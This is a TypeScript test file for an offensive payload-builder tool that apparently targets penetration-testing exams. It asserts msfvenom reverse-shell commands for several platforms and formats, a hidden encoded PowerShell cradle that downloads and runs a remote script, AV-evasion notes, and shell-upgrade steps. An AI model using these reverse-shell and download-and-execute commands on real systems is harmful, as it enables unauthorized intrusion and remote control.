import { describe, expect, it } from "vitest";
import { decodeUtf16leBase64 } from "../../../engines/payloads/encode";
import { buildPayload } from "../../../engines/payloads/build";
import { rankPayloads, type PayloadSituation } from "../../../engines/payloads/fit";
import { MSFVENOM } from "../../../engines/payloads/msfvenom";
import { encodePs } from "../../../engines/payloads/encodePs";
import { UPGRADE } from "../../../engines/payloads/upgrade";
import type { PayloadDef } from "../../../engines/payloads/types";

const vals = { LHOST: "192.0.2.10", LPORT: "443" };
const pOf = (d: PayloadDef) => /-p\s+(\S+)/.exec(d.template)![1];

describe("MSFVENOM", () => {
  it("no MSFVENOM def contains meterpreter or a staged path (/shell/reverse)", () => {
    expect(MSFVENOM.length).toBeGreaterThanOrEqual(8);
    for (const d of MSFVENOM) {
      expect(d.template).not.toMatch(/meterpreter|\/shell\/reverse/i);
      expect(d.id).not.toMatch(/meterpreter/i);
      expect(d.bakesIp).toBe(true);
      expect(d.generator).toBe("msfvenom");
    }
  });
  it("covers the required payload/format pairs", () => {
    const pairs = MSFVENOM.map((d) => `${pOf(d)}:${/-f\s+(\S+)/.exec(d.template)![1]}`);
    for (const p of [
      "windows/x64/shell_reverse_tcp:exe", "windows/x64/shell_reverse_tcp:dll", "windows/x64/shell_reverse_tcp:hta-psh",
      "windows/shell_reverse_tcp:exe", "linux/x64/shell_reverse_tcp:elf", "windows/x64/shell_reverse_tcp:aspx",
      "java/jsp_shell_reverse_tcp:war",
    ]) expect(pairs).toContain(p);
    expect(new Set(MSFVENOM.map((d) => d.id)).size).toBe(MSFVENOM.length);
  });
  it("builds a clean command with parts for -p LHOST LPORT -f -o", () => {
    const b = buildPayload(MSFVENOM.find((d) => d.id === "msf-win-x64-exe")!, "bash-prompt", vals);
    expect(b.text).toBe("msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.0.2.10 LPORT=443 -f exe -o rev.exe");
    expect(b.unresolved).toEqual([]);
    for (const t of ["-p", "LHOST", "LPORT", "-f", "-o"]) expect(b.parts.some((p) => p.token.startsWith(t))).toBe(true);
    expect(b.listener).toBe("penelope -O -p 443");
    expect(b.notes.join(" ")).toMatch(/or nc; no multi\/handler needed for stageless shell/);
  });
  it("x86 exe carries the Veil/Shellter note", () => {
    const d = MSFVENOM.find((x) => pOf(x) === "windows/shell_reverse_tcp" && x.template.includes("-f exe"))!;
    expect((d.notes ?? []).join(" ")).toContain("x86 for Veil/Shellter");
  });
  it("every def is a fit in exam mode; staged/meterpreter would be folded", () => {
    const s: PayloadSituation = {
      os: null, services: [], prompt: null, webShellUrl: null, tools: { present: [], absent: [] },
      failedPayloadIds: [], exam: true, dbEngine: null,
    };
    const r = rankPayloads(MSFVENOM, s, null);
    expect(r.misfits).toEqual([]);
    expect(r.fits).toHaveLength(MSFVENOM.length);
    const base = MSFVENOM[0];
    for (const p of ["windows/x64/meterpreter/reverse_tcp", "windows/x64/shell/reverse_tcp"]) {
      const bad = { ...base, id: "synthetic", template: base.template.replace(pOf(base), p) };
      const rr = rankPayloads([bad], s, null);
      expect(rr.misfits[0]?.reason).toBe("Not allowed in the exam");
    }
  });
});

describe("encodePs", () => {
  it("round-trips", () => {
    const cmd = "IEX (New-Object Net.WebClient).DownloadString('http://192.0.2.10/rev.ps1')";
    const b = encodePs(cmd);
    const m = /^powershell -nop -w hidden -e (\S+)$/.exec(b.text)!;
    expect(decodeUtf16leBase64(m[1])).toBe(cmd);
    expect(b.notes).toContain(`Decodes to: ${cmd}`);
    expect(b.def.generator).toBe("encode");
    expect(b.def.os).toBe("windows");
    expect(b.parts.map((p) => p.token)).toEqual(expect.arrayContaining(["-nop", "-w hidden", "-e"]));
    expect(b.parts.map((p) => p.explain).join(" ")).toMatch(/UTF-16LE/);
    expect(b.unresolved).toEqual([]);
  });
});

describe("UPGRADE", () => {
  it("upgrade steps are in order", () => {
    expect(UPGRADE.map((d) => d.template)).toEqual([
      `python3 -c 'import pty; pty.spawn("/bin/bash")'`,
      "script -qc /bin/bash /dev/null",
      "Ctrl-Z",
      "stty raw -echo; fg",
      "export TERM=xterm-256color",
      "stty rows {ROWS} cols {COLS}",
      "export HOME=/home/{USER}",
    ]);
    for (const d of UPGRADE) {
      expect(d.generator).toBe("upgrade");
      expect(d.os).toBe("linux");
      expect(d.contexts).toEqual(["bash-prompt"]);
      expect(d.listener).toBe("none");
    }
    expect(new Set(UPGRADE.map((d) => d.id)).size).toBe(UPGRADE.length);
  });
  it("notes: HOME trap and penelope", () => {
    const home = UPGRADE[UPGRADE.length - 1];
    expect((home.notes ?? []).join(" ")).toContain("when the shell inherited root's HOME");
    expect(UPGRADE.flatMap((d) => d.notes ?? []).join(" ")).toMatch(/penelope upgrades on its own/i);
  });
  it("stty step has placeholders with defaults", () => {
    const b = buildPayload(UPGRADE[5], "bash-prompt", {});
    expect(b.text).toMatch(/^stty rows \d+ cols \d+$/);
  });
});
